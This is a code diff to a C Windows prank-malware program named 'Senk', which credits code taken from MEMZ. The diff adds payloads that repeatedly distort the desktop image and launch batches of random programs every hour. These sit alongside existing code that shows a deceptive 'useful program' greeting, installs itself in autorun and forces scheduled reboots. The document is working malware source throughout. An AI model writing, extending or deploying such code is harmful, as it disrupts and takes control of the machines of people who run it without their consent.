@@ -44,6 +44,11 @@
 #define INTERVAL 10000
 
 int isRunning;
+const char* programs[] = {
+    "notepad.exe","calc.exe","mspaint.exe","cmd.exe", "mmc.exe"
+};
+
+int programsSize = 5;
 
 /*
 
@@ -61,7 +66,12 @@ LPSTR desktop_directory()
 }
 
 
-//Thanks Leurak (github.com/Leurak/MEMZ)
+/*
+
+    A lot of next code was written by Leurak in MEMZ (github.com/Leurak/MEMZ)
+    Thanks!
+
+*/
 HCRYPTPROV prov;
 
 int random() {
@@ -163,12 +173,30 @@ void payload5() {
     ShellExecute(NULL, "open", "shutdown", "-r -t 60 -c \"It's time to end lessons! Source code: github.com/MrOnlineCoder/Senk\"",  NULL, SW_SHOWNORMAL);
 }
 
+void payload6() {
+    HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+	RECT rekt;
+	GetWindowRect(hwnd, &rekt);
+	int w = rekt.right - rekt.left;
+    int h = rekt.bottom - rekt.top;
+    StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);
+}
+
+void payload7() {
+    for (int i=0;i<10;i++) {
+        ShellExecute(NULL, "open", programs[random() % programsSize], NULL,  NULL, SW_SHOWNORMAL);
+    }
+
+}
+
 int main(int argc, char* argv[]) {
     MessageBoxA(NULL, "Senk you for using this useful program! P.S. Source code: github.com/MrOnlineCoder/Senk", "by MrOnlineCoder", MB_OK | MB_ICONEXCLAMATION);
 
     isRunning = 1;
 
     putInAutorun();
+
 
     while (isRunning == 1) {
         SYSTEMTIME st;
@@ -179,7 +207,6 @@ int main(int argc, char* argv[]) {
         WORD mins = st.wMinute;
         WORD hours = st.wHour;
         WORD secs = st.wSecond;
-
 
         if (mins == 0 && hours == 11 && secs <= 20) {
             for (int i=0;i<50;i++) {
@@ -201,6 +228,17 @@ int main(int argc, char* argv[]) {
             payload4();
         } else if(mins == 0 && hours == 14 && secs <= 20) {
             payload5();
+        } else if (mins == 30 && hours == 14 ) {
+            for (int i=0;i<20;i++) {
+                payload6();
+                Sleep(50);
+            }
+
+        }
+
+        if (mins == 59 && secs <= 20) {
+            payload7();
+            Sleep(PAYLOAD_DELAY);
         }
 
         Sleep(INTERVAL);
